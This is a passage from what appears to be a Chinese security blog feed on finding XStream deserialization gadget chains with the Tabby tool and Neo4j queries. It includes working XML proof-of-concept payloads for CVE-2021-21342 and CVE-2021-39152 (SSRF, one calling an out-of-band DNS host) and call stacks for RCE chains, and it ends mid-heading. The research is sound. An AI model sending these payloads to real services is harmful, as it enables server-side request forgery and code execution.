&lt;h2 id=&quot;CVE-2021-2471&quot;&gt;&lt;a href=&quot;#CVE-2021-2471&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-2471&quot;&gt;&lt;/a&gt;CVE-2021-2471&lt;/h2&gt;&lt;h3 id=&quot;DOMSource-XXE&quot;&gt;&lt;a href=&quot;#DOMSource-XXE&quot; class=&quot;headerlink&quot; title=&quot;DOMSource XXE&quot;&gt;&lt;/a&gt;DOMSource XXE&lt;/h3&gt;&lt;p&gt;漏洞代码在 com.mysql.cj.jdbc.MysqlSQLXML#getSource&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Mysql" scheme="http://m0d9.me/tags/Mysql/"/>
    
    <category term="XXE" scheme="http://m0d9.me/tags/XXE/"/>
    
    <category term="Fabric" scheme="http://m0d9.me/tags/Fabric/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化（三）——Tabby CVE之旅</title>
    <link href="http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/"/>
    <id>http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</id>
    <published>2021-08-29T09:03:00.000Z</published>
    <updated>2022-03-28T03:33:41.126Z</updated>
    
    <content type="html"><![CDATA[<p>月底在即，再不写点东西，每月一篇都要食言了。上个月刚挖的OpenRASP的坑，本打算再研究研究绕过姿势，验证下猜想，也没下文。正好6月份交的XStream SSRF Gadget CVE下来，之前XStream系列草稿箱里也待着之前逆向分析师傅们挖掘的思路&amp;手法，正好编辑编辑，水一篇”如何挖掘XStream Gadgets”。</p><p>首先感谢Wh1t3p1g师傅的Tabby，用起来比gadgetinspector更顺手，找链神器。</p><h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>有关Tabby的介绍，详情可以参考【1】中Wh1t3p1g师傅的几个wiki，写的很详细了，这里也不多啰嗦。（这里膜一下Wh1t3p1g师傅）</p><p>Neo4j 查询比较吃cpu，小本本加上idea同时跑吃力，搞台vps跑比较好，但是tabby是通过apoc.load.csv file写Neo4j数据的，相当于限制了本机，因此给下整库的dump和load（当然，直接整个在vps上操作也是ok的）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump neo4j database</span></span><br><span class="line">neo4j-admin dump --to /tmp/neo4j.dump --database neo4j</span><br><span class="line"><span class="comment"># scp dump file to vps</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load neo4j dump file</span></span><br><span class="line">./bin/neo4j stop</span><br><span class="line">./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force</span><br><span class="line">./bin/neo4j start</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Gadgets结构"><a href="#Gadgets结构" class="headerlink" title="Gadgets结构"></a>Gadgets结构</h2><p>前文的众多的RCE Gadgets分析中发现Gadgets的结构大致分为：</p><p><strong>Bullet：</strong><br>实现最终的RCE</p><p>rce:</p><ol><li>ProcessBuilder.start() 无参数</li><li>Runtime.getRuntime().exec(cmd) 有参</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) 无参</li><li>MethodClosure.call() 无参</li></ol><p>ssrf:</p><ol><li>java.net.URL#openConnection</li></ol><p><strong>核心中间链</strong><br>中间链是整个寻找Gadgets的核心，简单的可能没有中间链，复杂的可能会组合使用</p><ol><li>invoke 实现上有问题的 InvokeHandler，如<ul><li>EventHandler</li><li>搭配MethodClosure的ConvertedClosure</li></ul></li><li>hashCode、compare、equal实现有问题的Map/Set/Queue，如<ul><li>Expando，hashCode搭配MethodClosure可以RCE</li><li>CVE-2021-21345 ServerTableEntry verify方法可RCE</li></ul></li><li>存在invoke，且method、obj可控的class（这一类普遍存在）<ul><li>CVE-2020-26217 ImageIO$ContainsFilter，filter方法内可控</li><li>CVE-2021-21344 Accessor$GetterSetterReflection，get方法可控</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSome方法内invoke可控</li></ul></li><li>利用ClassLoader实例化<ul><li>ServiceLoader$LazyIterator，调用点为Class.forName (name,initialize,loader) ，指定loader为BCEL classLoaer</li><li>CVE-2021-21347，调用点为loader.loadClass(name).newInstance()，利用java.net.URLClassLoader加载远程jar类并实例化</li><li>CVE-2021-21350，和LazyIterator一样，利用BCEL classLoader</li></ul></li></ol><p><strong>Trigger：</strong><br>类似扳机的作用？整个链的起点</p><ol><li>MapConverter/TreeSetConveter/TreeMapConveter都会触发这些集合/表 内元素的内部函数，比如compare、hashCode、equals这些函数。<ul><li>MapConverter类型put对象时调用该对象的hashCode、equals、toString方法</li><li>TreeSet调用put对象时调用该对象的compareTo方法</li><li>PriorityQueue触发comparator属性中compare方法</li></ul></li><li>DynamicProxyConverter 代理类，InvocationHandler可控，导致一些invoke存在RCE风险的InvocationHandler类，如EventHandler，可以加以利用。</li></ol><h2 id="CVEs"><a href="#CVEs" class="headerlink" title="CVEs"></a>CVEs</h2><p>在了解了neo4j &amp; tabby &amp; Gadges组成 的基础上，那就让我们尝试使用Tabby的挖掘XStream Gadgets。精力有限，以以下几个CVE为例（难易程度排序）</p><ul><li>CVE-2021-21342 </li><li>CVE-2021-39152</li><li>CVE-2021-21351</li><li>CVE-2021-21346</li><li>CVE-2021-21347/21350</li><li>CVE-2020-26217</li><li>CVE-2021-21344/21345</li></ul><h3 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h3><h4 id="寻找Bullet"><a href="#寻找Bullet" class="headerlink" title="寻找Bullet"></a>寻找Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="寻找中间链"><a href="#寻找中间链" class="headerlink" title="寻找中间链"></a>寻找中间链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openStream&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>节点很多，以javax.activation.URLDataSource$getInputStream 为例</p><p><img src="/images/pasted-156.png" alt="upload successful"></p><h4 id="寻找Trigger"><a href="#寻找Trigger" class="headerlink" title="寻找Trigger"></a>寻找Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;getOutputStream&quot; and m1.CLASSNAME&#x3D;&quot;javax.activation.URLDataSource&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-161.png" alt="upload successful"></p><!-- ![upload successful](/images/pasted-144.png) --><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>false<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.client.ResponseContext&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span> <span class="attr">class</span>=<span class="string">&quot;java.util.IdentityHashMap&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">size</span>&gt;</span>0<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">satellites</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;javax.activation.URLDataSource&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://cve21342.xstream.1.dns.m0d9.me/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">wasTransportSecure</span>&gt;</span>false<span class="tag">&lt;/<span class="name">wasTransportSecure</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span>false<span class="tag">&lt;/<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">state</span>&gt;</span>ServerRequest<span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isFastInfosetDisabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isFastInfosetDisabled</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h3><p>这个链应该是 ssrf最短的链了</p><h4 id="寻找Bullet-1"><a href="#寻找Bullet-1" class="headerlink" title="寻找Bullet"></a>寻找Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="寻找中间链-1"><a href="#寻找中间链-1" class="headerlink" title="寻找中间链"></a>寻找中间链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openConnection&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>节点很多，以jdk.nashorn.internal.runtime.Source$URLData#loadMeta 为例<br><img src="/images/pasted-160.png" alt="upload successful"></p><h4 id="寻找Trigger-1"><a href="#寻找Trigger-1" class="headerlink" title="寻找Trigger"></a>寻找Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;loadMeta&quot; and m1.CLASSNAME&#x3D;&quot;jdk.nashorn.internal.runtime.Source$URLData&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-159.png" alt="upload successful"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">cs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="寻找核心调用链1"><a href="#寻找核心调用链1" class="headerlink" title="寻找核心调用链1"></a>寻找核心调用链1</h4><p>中间链以com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces#parseSome为例</p><p><img src="/images/pasted-171.png" alt="upload successful"></p><p><img src="/images/pasted-172.png" alt="upload successful"><br>发现method、class、args都可控，需要做的就是找到一条链</p><h4 id="寻找核心调用链2"><a href="#寻找核心调用链2" class="headerlink" title="寻找核心调用链2"></a>寻找核心调用链2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;parseSome&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-170.png" alt="upload successful"></p><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><p>调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:206, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:312, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:121, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h3><h4 id="核心调用链"><a href="#核心调用链" class="headerlink" title="核心调用链"></a>核心调用链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;createValue&quot; and m1.CLASSNAME&#x3D;&quot;sun.swing.SwingLazyValue&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-175.png" alt="upload successful"></p><h4 id="调用栈-1"><a href="#调用栈-1" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-21347-21350"><a href="#CVE-2020-21347-21350" class="headerlink" title="CVE-2020-21347/21350"></a>CVE-2020-21347/21350</h3><p>21347/21350这两个类似，都是用NameProcessIterator自定义classloader加载，链也比较简单。</p><h4 id="核心调用链1"><a href="#核心调用链1" class="headerlink" title="核心调用链1"></a>核心调用链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;loadClass&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-176.png" alt="upload successful"></p><h4 id="核心调用链2"><a href="#核心调用链2" class="headerlink" title="核心调用链2"></a>核心调用链2</h4><p>比较难搞的是hasNext关联Next，很容易关联到Trigger，造成误报</p><p>需要手动发现至SequenceInputStream.nextStream，然后参考CVE-2020-26217的ByteArrayOutputStreamEx链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;hasNext&quot;,CLASSNAME:&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;&#125;)-[r:CALL|ALIAS*3..10]-(m2:Method) </span><br><span class="line">where m2.NAME in [&quot;toString&quot;]</span><br><span class="line">return path limit 200</span><br></pre></td></tr></table></figure><p>这部分的与之类似，不单独列了</p><h4 id="调用栈-2"><a href="#调用栈-2" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:131, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" 